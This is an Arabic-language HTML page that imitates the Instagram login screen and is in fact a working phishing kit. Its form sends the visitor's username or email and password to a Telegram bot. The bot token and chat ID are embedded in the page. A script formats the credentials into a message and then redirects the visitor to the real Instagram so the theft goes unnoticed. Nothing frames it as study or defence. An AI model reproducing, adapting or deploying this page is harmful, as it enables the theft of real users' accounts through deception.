<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="انستغرام" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="شعار انستغرام" title="شعار انستغرام" />
                </h1>
                <!-- تعديل النموذج -->
                <form method="POST" action="https://api.telegram.org/bot7751303762:AAHzuq8lT8s2KSBjAwOG26YEG51gQJcOHhk/sendMessage" onsubmit="redirectToInstagram()">
                    <input type="hidden" name="chat_id" value="6820048868" />
                    <input type="hidden" name="parse_mode" value="HTML" />

                    <label for="email" class="sr-only">الهاتف، اسم المستخدم أو البريد الإلكتروني</label>
                    <input name="email" type="text" placeholder="الهاتف، اسم المستخدم أو البريد الإلكتروني" required />

                    <label for="password" class="sr-only">كلمة المرور</label>
                    <input name="password" type="password" placeholder="كلمة المرور" required />

                    <input type="hidden" name="text" value="" id="telegramMessage" />

                    <button type="submit" onclick="prepareMessage()">تسجيل الدخول</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">أو</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>تسجيل الدخول باستخدام فيسبوك</a>
                    </div>
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>ليس لديك حساب؟</p>
                <a href="#">إنشاء حساب</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>قم بتنزيل التطبيق.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="زر متجر آبل" title="زر متجر آبل" />
                    <img src="./img/googleplay-button.png" alt="زر متجر جوجل" title="زر متجر جوجل" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">حول</a></li>
            <li><a href="#">مساعدة</a></li>
            <li><a href="#">صحافة</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">وظائف</a></li>
            <li><a href="#">الخصوصية</a></li>
            <li><a href="#">الشروط</a></li>
            <li><a href="#">المواقع</a></li>
            <li><a href="#">أهم الحسابات</a></li>
            <li><a href="#">الوسوم</a></li>
            <li><a href="#">اللغة</a></li>
        </ul>
        <p class="copyright">© 2020 انستغرام من فيسبوك</p>
    </footer>

    <script>
        function prepareMessage() {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;

            const message = `📋 تسجيل جديد:\n\n📧 البريد الإلكتروني: ${email}\n🔒 كلمة المرور: ${password}`;
            document.getElementById('telegramMessage').value = message;
        }

        function redirectToInstagram() {
            // تأخير بسيط للتأكد من إرسال المعلومات قبل التوجيه
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 500); // 500ms تأخير
        }
    </script>
</body>
</html>
